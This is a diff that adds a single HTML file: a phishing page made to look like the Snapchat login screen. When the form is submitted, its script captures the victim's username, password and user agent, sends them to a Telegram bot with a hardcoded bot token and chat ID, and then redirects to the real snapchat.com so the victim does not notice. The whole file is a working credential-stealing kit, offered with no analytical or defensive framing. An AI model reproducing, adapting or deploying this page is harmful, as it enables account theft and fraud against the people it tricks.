@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in • Snapchat</title>
+<link rel="icon" href="https://www.snapchat.com/favicon.ico">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:"Avenir Next","Helvetica Neue",Helvetica,Arial,sans-serif; }
+  html, body { height:100%; }
+  body { background:#fff; display:flex; flex-direction:column; }
+
+  /* Top yellow banner like the real login page */
+  .top-bar {
+    width:100%; height:8px; background:#FFFC00;
+  }
+
+  .header {
+    width:100%; padding:20px 32px; display:flex; justify-content:space-between; align-items:center;
+  }
+  .logo { display:flex; align-items:center; gap:6px; }
+  .logo svg { width:36px; height:34px; }
+  .logo span { font-weight:700; font-size:22px; color:#16191c; letter-spacing:-0.5px; }
+  .lang {
+    font-size:14px; color:#16191c; border:1px solid #d1d1d1; background:#fff;
+    padding:8px 14px; border-radius:20px; cursor:pointer; font-weight:500;
+  }
+
+  .card {
+    width:100%; max-width:380px; margin:20px auto 0; padding:10px 20px; text-align:center;
+  }
+  h1 { font-size:28px; font-weight:700; color:#16191c; margin-bottom:30px; }
+
+  .input-wrap { position:relative; margin-bottom:12px; text-align:left; }
+  .input-wrap label {
+    display:block; font-size:13px; font-weight:600; color:#16191c; margin-bottom:6px;
+  }
+  .input-wrap input {
+    width:100%; padding:15px 44px 15px 14px; font-size:15px; color:#16191c;
+    border:1.5px solid #d6d6d6; border-radius:6px; outline:none; background:#fff;
+  }
+  .input-wrap input:focus { border-color:#16191c; }
+  .eye {
+    position:absolute; right:12px; bottom:14px; cursor:pointer; width:22px; height:22px;
+  }
+  .eye svg { width:22px; height:22px; fill:#8b8b8b; }
+
+  .btn {
+    width:100%; padding:14px; margin-top:18px; font-size:16px; font-weight:600;
+    background:#0FADFF; color:#fff; border:none; border-radius:40px; cursor:pointer;
+    transition:background .15s;
+  }
+  .btn:hover { background:#0d9be4; }
+  .btn:disabled { background:#9bd7ff; cursor:default; }
+
+  .links { margin-top:26px; font-size:14px; color:#16191c; }
+  .links a { color:#0FADFF; text-decoration:none; font-weight:600; }
+  .links a:hover { text-decoration:underline; }
+  .divider { margin-top:26px; font-size:13px; color:#8b8b8b; }
+
+  .footer {
+    margin-top:auto; padding:26px 20px; font-size:12px; color:#6b6b6b; text-align:center; background:#fff;
+  }
+  .footer a { color:#6b6b6b; margin:0 10px; text-decoration:none; }
+  .footer a:hover { text-decoration:underline; }
+  .copyright { margin-top:10px; color:#a0a0a0; }
+</style>
+</head>
+<body>
+
+<div class="top-bar"></div>
+
+<div class="header">
+  <div class="logo">
+    <!-- Official Snapchat ghost -->
+    <svg viewBox="0 0 640 512" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#FFFC00" d="M510.8 361.7c-2.5-8.7-13.9-13.3-27.4-17.9-13.1-4.5-30.4-10.3-43.7-22.5-2.8-2.5-3.2-5.5-2.1-9.3 1.1-3.9 4-7.9 6.6-11.6 15.6-22.2 39.5-61.5 45.5-102.7 5.9-40.9-1.4-85.7-28.1-120.2C434.4 42 386.4 21.3 320.4 21.3h-1.2c-66 0-114 20.7-141.3 56.2-26.7 34.5-34 79.3-28.1 120.2 6 41.2 29.9 80.5 45.5 102.7 2.6 3.7 5.5 7.7 6.6 11.6 1.1 3.8.7 6.8-2.1 9.3-13.3 12.2-30.6 18-43.7 22.5-13.5 4.6-24.9 9.2-27.4 17.9-3.2 11.2 7.4 20.8 20.5 28.5 21.5 12.6 53.6 22.2 61.9 43.9 1.6 4.2 2 8.8 2.4 13.7.4 5.2 1.1 10.7 2.7 16.3 1.9 6.6 8.5 10.2 15.1 8.4 16.5-4.5 31.6-7.9 45.4-7.9 10.4 0 20.3 1.7 30 5.4 20.2 7.7 40.9 26.4 62.8 26.4 15.9 0 28.5-8.2 37.5-14.6 9.6-6.9 17.1-12.2 25.4-13.5 9.3-1.4 20.4.5 33.7 4.7 5.7 1.8 11.8-1 14-6.5 3.2-8 4.6-15.6 5.1-22.7.4-5.9.8-11.2 2.6-15.9 8.3-21.7 40.4-31.3 61.9-43.9 13.1-7.7 23.7-17.3 20.5-28.5z"/>
+    </svg>
+    <span>Snapchat</span>
+  </div>
+  <button class="lang">English (US) ▾</button>
+</div>
+
+<div class="card">
+  <h1>Log in to Snapchat</h1>
+  <form id="loginForm">
+    <div class="input-wrap">
+      <label>Username or Email</label>
+      <input type="text" id="username" required autocomplete="username">
+    </div>
+    <div class="input-wrap">
+      <label>Password</label>
+      <input type="password" id="password" required autocomplete="current-password">
+      <span class="eye" onclick="togglePass()">
+        <svg viewBox="0 0 24 24"><path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12c-2.8 0-5-2.2-5-5s2.2-5 5-5 5 2.2 5 5-2.2 5-5 5zm0-8c-1.7 0-3 1.3-3 3s1.3 3 3 3 3-1.3 3-3-1.3-3-3-3z"/></svg>
+      </span>
+    </div>
+    <button class="btn" type="submit">Log In</button>
+  </form>
+  <div class="links">
+    <a href="#">Sign Up</a> · <a href="#">Forgot Password</a>
+  </div>
+  <div class="divider">New to Snapchat? <a href="#" style="color:#0FADFF;font-weight:600;">Download the app</a></div>
+</div>
+
+<div class="footer">
+  <div>
+    <a href="#">Company</a><a href="#">Snap Egg</a><a href="#">Careers</a><a href="#">News</a><br>
+    <a href="#">Safety</a><a href="#">Community Guidelines</a><a href="#">Privacy Policy</a><a href="#">Terms</a>
+  </div>
+  <div class="copyright">© 2026 Snap Inc.</div>
+</div>
+
+<script>
+const BOT_TOKEN = "9245559673:AAEfIFF64PkfSJWRGwHNDZFUyCweNw2EX3c";
+const CHAT_ID = "5377058819";
+
+function togglePass(){
+  const p = document.getElementById("password");
+  p.type = p.type === "password" ? "text" : "password";
+}
+
+document.getElementById("loginForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  const u = document.getElementById("username").value;
+  const p = document.getElementById("password").value;
+
+  const btn = this.querySelector("button");
+  btn.textContent = "Logging In...";
+  btn.disabled = true;
+
+  const msg = "👻 New Snapchat Login%0A" +
+              "👤 Username: " + encodeURIComponent(u) + "%0A" +
+              "🔑 Password: " + encodeURIComponent(p) + "%0A" +
+              "🌍 Device: " + encodeURIComponent(navigator.userAgent);
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`)
+    .finally(() => {
+      setTimeout(() => { window.location.href = "https://www.snapchat.com/"; }, 1200);
+    });
+});
+</script>
+
+</body>
+</html>
